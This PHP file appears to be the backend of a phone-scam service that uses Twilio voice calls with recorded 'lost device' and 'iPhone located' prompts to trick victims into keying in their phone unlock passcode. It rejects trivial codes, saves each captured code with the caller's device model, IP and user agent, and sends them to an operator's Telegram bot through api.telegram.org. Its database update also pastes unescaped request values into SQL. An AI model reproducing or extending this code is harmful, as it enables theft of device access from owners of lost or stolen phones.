<?php
 require_once "config/config.php"; 
 require __DIR__ . '/vendor/autoload.php';
 use Twilio\TwiML\VoiceResponse;
 $response = new VoiceResponse();
 
 $dominio   = 'dsunlocks-world.com';
 $id        = $_GET['id'];
 $idusuario = $_GET['idusuario'];
 $metodo    = $_GET['metodo'];
 $chatid    = $_GET['chatid'];
 $token     = $_GET['token'];
 $usuario   = str_replace('+', ' ', $_GET['usuario']);
 $usuarior   = str_replace(' ', '+', $usuario);
 $modelo    = str_replace('+', ' ', $_GET['modelo']);
 $modelor   = str_replace(' ', '+', $modelo);
 $estatus   = 0;
 $detalle   = "";
 $tiempo = 30;
 switch ($metodo) {

   case 'dpcodigo4':

    if(empty($_POST["Digits"])) {
      
      $gather = $response->gather([ 'input' => 'dtmf', 'timeout' => 15, 'numDigits' => 4 ]);
      $gather->play('https://'.$dominio.'/apipasscode/DispositivoPerdido/passcode4-esp.mp3');
      

    }else{
      
      if(strlen($_POST['Digits'])==4){

        $estatus = 1; //Correcto
        $detalle = 'Codigo de desbloqueo correcto ✅';
        $codigo = $_POST["Digits"];
        $response->play('https://'.$dominio.'/apipasscode/DispositivoPerdido/correcto/passcode4-esp.mp3');  

      }else{

        $estatus = 2; //Fallido
        $detalle = 'Codigo de desbloqueo erroneo ❌';
        $codigo = $_POST["Digits"];
        $response->play('https://'.$dominio.'/apipasscode/DispositivoPerdido/fallido/passcode4-esp.mp3');
      }
     
    }
   break;

   case 'dpcodigo6':

    if(empty($_POST["Digits"])) {
      
      $gather = $response->gather([ 'input' => 'dtmf', 'timeout' =>15, 'numDigits' => 6 ]);
     
      $gather->play('https://'.$dominio.'/apipasscode/DispositivoPerdido/passcode6-esp.mp3');

    }else{
      
      if(strlen($_POST['Digits'])== 6){

        $estatus = 1; //Correcto
        $detalle = 'Codigo de desbloqueo correcto ✅';
        $codigo = $_POST["Digits"];
        $response->play('https://'.$dominio.'/apipasscode/DispositivoPerdido/correcto/passcode6-esp.mp3');

      }else{

        $estatus = 2; //Fallido
        $detalle = 'Codigo de desbloqueo erroneo ❌';
        $codigo = $_POST["Digits"];
        $response->play('https://'.$dominio.'/apipasscode/DispositivoPerdido/fallido/passcode6-esp.mp3');          

      }
     
    }
   
   break;

   case 'iplocalizadoes':

    if(empty($_POST["Digits"])) {
      
      $gather = $response->gather([ 'input' => 'dtmf', 'timeout' => 15]);
     
      $gather->play('https://'.$dominio.'/apipasscode/iPhoneLocalizado/es/pass-esp.mp3');

    }else{
      
      if($_POST['Digits'] != "1234" && $_POST['Digits'] != "123456" && $_POST['Digits'] != "1111" && $_POST['Digits'] != "111111" && $_POST['Digits'] != "123" && $_POST['Digits'] != "1" && $_POST['Digits'] != "11"  && $_POST['Digits'] != "0000"  && $_POST['Digits'] != "000000" && $_POST['Digits'] != "0"  && $_POST['Digits'] != "000" && $_POST['Digits'] != "00"){

        $estatus = 1; //Correcto
        $detalle = 'Codigo de desbloqueo correcto ✅';
        $codigo = $_POST["Digits"];
        $response->play('https://'.$dominio.'/apipasscode/iPhoneLocalizado/es/correcto/pass-esp.mp3');

      }else{

        $estatus = 2; //Fallido
        $detalle = 'Codigo de desbloqueo erroneo ❌';
        $codigo = $_POST["Digits"];
        $response->play('https://'.$dominio.'/apipasscode/iPhoneLocalizado/es/fallido/pass-esp.mp3');          

      }
     
    }

   break;

   case 'iplocalizadoen':

    if(empty($_POST["Digits"])) {
      
      $gather = $response->gather([ 'input' => 'dtmf', 'timeout' => 15]);
     
      $gather->play('https://'.$dominio.'/apipasscode/iPhoneLocalizado/en/pass-esp.mp3');

    }else{
      
      if($_POST['Digits'] != "1234" && $_POST['Digits'] != "123456" && $_POST['Digits'] != "1111" && $_POST['Digits'] != "111111" && $_POST['Digits'] != "123" && $_POST['Digits'] != "1" && $_POST['Digits'] != "11"  && $_POST['Digits'] != "0000"  && $_POST['Digits'] != "000000" && $_POST['Digits'] != "0"  && $_POST['Digits'] != "000" && $_POST['Digits'] != "00"){

        $estatus = 1; //Correcto
        $detalle = 'Codigo de desbloqueo correcto ✅';
        $codigo = $_POST["Digits"];
        $response->play('https://'.$dominio.'/apipasscode/iPhoneLocalizado/en/correcto/pass-esp.mp3');

      }else{

        $estatus = 2; //Fallido
        $detalle = '❌ Codigo de desbloqueo erroneo ❌';
        $codigo = $_POST["Digits"];
        $response->play('https://'.$dominio.'/apipasscode/iPhoneLocalizado/en/fallido/pass-esp.mp3');          

      }
     
    }   
  
   break;

   case 'ipPerdidoES': 

    if(empty($_POST["Digits"])) {

     $gather = $response->gather([ 'input' => 'dtmf', 'timeout' => 15, 'numDigits' => 4]);     
     $gather->play('https://'.$dominio.'/apipasscode/iPhonePerdido/es/p4-es_esEs.mp3');  

    }else{

      if(strlen($_POST['Digits'])== 4){

        $estatus = 1; //Correcto
        $detalle = 'Codigo de desbloqueo correcto ✅';
        $codigo = $_POST["Digits"];

      }else{

        $estatus = 2; //Fallido
        $detalle = 'Codigo de desbloqueo erroneo ❌';
        $codigo = $_POST["Digits"];   

      }

    }
  
   break;

    case 'ipPerdidoEN': 

    if(empty($_POST["Digits"])) {

     $gather = $response->gather([ 'input' => 'dtmf', 'timeout' => 15, 'numDigits' => 4]);     
     $gather->play('https://'.$dominio.'/apipasscode/iPhonePerdido/en/4passcodeEN.mp3');  

    }else{

      if(strlen($_POST['Digits'])== 4){

        $estatus = 1; //Correcto
        $detalle = 'Codigo de desbloqueo correcto ✅';
        $codigo = $_POST["Digits"];

      }else{

        $estatus = 2; //Fallido
        $detalle = 'Codigo de desbloqueo erroneo ❌';
        $codigo = $_POST["Digits"];   

      }

    }
  
   break;

   case 'ipPerdidoIN': 

    if(empty($_POST["Digits"])) {

     $gather = $response->gather([ 'input' => 'dtmf', 'timeout' => 15, 'numDigits' => 4]);     
     $gather->play('https://'.$dominio.'/apipasscode/iPhonePerdido/in/p6-seIN');  

    }else{

      if(strlen($_POST['Digits'])== 6){

        $estatus = 1; //Correcto
        $detalle = 'Codigo de desbloqueo correcto ✅';
        $codigo = $_POST["Digits"];

      }else{

        $estatus = 2; //Fallido
        $detalle = 'Codigo de desbloqueo erroneo ❌';
        $codigo = $_POST["Digits"];   

      }

    }

   
   default:
    
     break;
 }

// Use the Twilio PHP SDK to build an XML response
 
 $ip = $_SERVER['REMOTE_ADDR'];
 $user_agent = $_SERVER["HTTP_USER_AGENT"];
 $timestamp = date("Y-m-d H:i:s");  
 if($estatus == 1){

   $sql = $con->prepare("UPDATE tblpasscode SET  codigo = '$codigo', estatus = '$estatus'  WHERE idusuario = '$idusuario' AND id = '$id'");
   $sql->execute();

    telegram($usuario, $modelo, $codigo, $timestamp, $ip, $user_agent, $detalle, $token, $chatid);
  
 }elseif($estatus == 2){

  $sql = $con->prepare("UPDATE tblpasscode SET  codigo = '$codigo', estatus = '$estatus'  WHERE idusuario = '$idusuario' AND id = '$id'");
   $sql->execute();

    
    telegram($usuario, $modelo, $codigo, $timestamp, $ip, $user_agent, $detalle, $token, $chatid);

    $response->redirect('https://'.$dominio.'/apipasscode/procesopasscode.php?id='.$id.'&idusuario='.$idusuario.'&metodo='.$metodo.'&chatid='.$chatid.'&token='.$token.'&usuario='.$usuarior.'&modelo='.$modelor);  
 }
 
 function telegram($usuario, $modelo, $codigo, $timestamp, $ip, $user_agent, $detalle, $token, $chatid){

    $msj = '✅ Datos obtenidos ✅ : 

     ➡️🔐 CODIGO OBTENIDO 🔏
            ✳️ '.$codigo.' ✳️
     <b>------------------------------</b>
     <b>👤 usuario :</b> '.$usuario.'
     <b>📱 modelo :</b> '.$modelo.'
     <b>------------------------------</b>
     <b>📅 Marca de Tiempo :</b> '.$timestamp.'
     <b>📍 Direccion IP :</b> '.$ip.'
     <b>🏢 User Agent :</b> '.$user_agent.'
     <b>------------------------------</b>
     ✳️ Detalles : '.$detalle;

        $url = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chatid."";
       $url = $url . "&parse_mode=HTML&text=". urlencode($msj);
       $ch = curl_init();
       $optArray = array(
                   CURLOPT_URL => $url,
                   CURLOPT_RETURNTRANSFER => true
       );
       curl_setopt_array($ch, $optArray);
       $result = curl_exec($ch);
       curl_close($ch); 

 }     
    


header('Content-Type: text/xml');
echo $response;

